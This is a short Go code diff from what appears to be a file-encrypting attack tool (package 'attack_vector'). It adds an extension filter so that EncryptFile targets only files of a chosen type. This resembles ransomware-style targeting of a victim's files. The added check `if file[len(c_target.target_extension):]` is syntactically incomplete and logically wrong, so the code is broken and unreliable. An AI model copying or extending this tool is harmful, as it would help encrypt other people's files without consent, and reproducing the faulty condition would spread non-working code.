@@ -17,6 +17,7 @@ type target_t struct {
 	target_name       string
 	encryption_method string
 	target_type       string // File or Folder
+	target_extension  string // What kind of extension are we looking for
 }
 
 var c_target target_t
@@ -33,6 +34,10 @@ func SetTarget(path string) { // Either a file or a folder
 	}
 
 	c_target.target_name = path
+}
+
+func SetExtension(new_extension string) {
+	c_target.target_extension = new_extension
 }
 
 func SetEncryptionMethod(method string) {
@@ -86,6 +91,8 @@ func EncryptFolder(dir string) {
 }
 
 func EncryptFile(file string) {
+	if file[len(c_target.target_extension):]
+
 	in, err := os.Open(file) // Target
 	if err != nil {
 		notify.Error(err.Error(), "attack_vector.EncryptFile()")
